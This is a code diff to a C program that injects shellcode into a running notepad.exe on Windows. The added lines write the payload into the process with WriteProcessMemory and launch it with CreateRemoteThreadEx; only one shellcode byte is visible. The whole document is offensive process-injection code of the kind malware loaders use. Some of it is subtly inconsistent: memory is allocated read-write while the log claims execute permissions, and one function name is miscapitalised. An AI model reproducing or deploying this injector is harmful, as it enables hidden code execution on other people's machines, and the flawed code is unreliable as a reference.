@@ -35,10 +35,11 @@ int main(int argc, char *argv[]) {
       "\xd5";
 
   // variables
-  HANDLE hProcess = NULL, hSnapshot = NULL;
-  LPVOID rAlloc_mem = NULL;
+  HANDLE hProcess = NULL, hSnapshot = NULL, hThread = NULL;
+  LPVOID lpAlloc_mem = NULL;
   PROCESSENTRY32 pe32;
   pe32.dwSize = sizeof(PROCESSENTRY32);
+  boolean bFound = false;
 
   // first we take a snapshot of the processes
   info("Taking Snapshot of the current processes...\n");
@@ -64,7 +65,7 @@ int main(int argc, char *argv[]) {
   do {
     if (wcscmp(pe32.szExeFile, L"notepad.exe") == 0) {
       info("%ls was found!\n", pe32.szExeFile);
-
+      bFound = true;
       // now we will get a handel of the process
       info("Trying to Get a handel of the process...\n");
       hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
@@ -79,17 +80,57 @@ int main(int argc, char *argv[]) {
 
       // Now we allocate bytes to the process memory.
       info("allocating bytes to the process memory...\n");
-      rAlloc_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
-                                  (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
-      if (!rAlloc_mem) {
-        warn("VirtualAllocEx failed in target process '%s' , error: %lu",
+      lpAlloc_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
+                                   (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
+      if (!lpAlloc_mem) {
+        warn("VirtualAllocEx failed in target process '%ls' , error: %lu",
              pe32.szExeFile, GetLastError());
         return EXIT_FAILURE;
       }
       okay("Allocated %zu bytes with PAGE_EXECUTE_READWRITE permissions",
            sizeof(shellcode));
+
+      // Now write the shellcode into the memory.
+      info("Writing the shellcode into memory...\n");
+      if (WriteProcessMemory(hProcess, lpAlloc_mem, shellcode,
+                             sizeof(shellcode), NULL)) {
+        okay("Wrote %zu bytes to memory\n", sizeof(shellcode));
+      } else {
+        warn("Failed to write to process '%ls' memory: %lu", pe32.szExeFile,
+             GetLastError());
+        return EXIT_FAILURE;
+      }
+      info("Creating a thread..\n");
+      // Now create a thread to run our payload
+      hThread = CreateRemoteThreadEx(hProcess, NULL, 0,
+                                     (LPTHREAD_START_ROUTINE)lpAlloc_mem, NULL,
+                                     0, NULL, NULL);
+      if (hThread == NULL) {
+        Warn("Failed to get handle to the thread, error: %ld", GetLastError());
+        CloseHandle(hProcess);
+        return EXIT_FAILURE;
+      }
+      okay("Got a handle to the thread <%ld>\n\\---0x%p", pe32.th32ProcessID,
+           hThread);
+
+      info("Waiting for the thread to finish executing....");
+      WaitForSingleObject(hThread, INFINITE);
+      okay("Thread finsihed execution!\n");
+
+      // cleanup
+      info("Cleanup...\n");
+      VirtualFreeEx(hProcess, lpAlloc_mem, 0, MEM_RELEASE);
+      CloseHandle(hThread);
+      CloseHandle(hProcess);
+      break;
     }
   } while (Process32Next(hSnapshot, &pe32));
+
+  if (bFound == true) {
+    okay("Fin!");
+  } else {
+    info("Not Found");
+  }
 
   return EXIT_SUCCESS;
 }
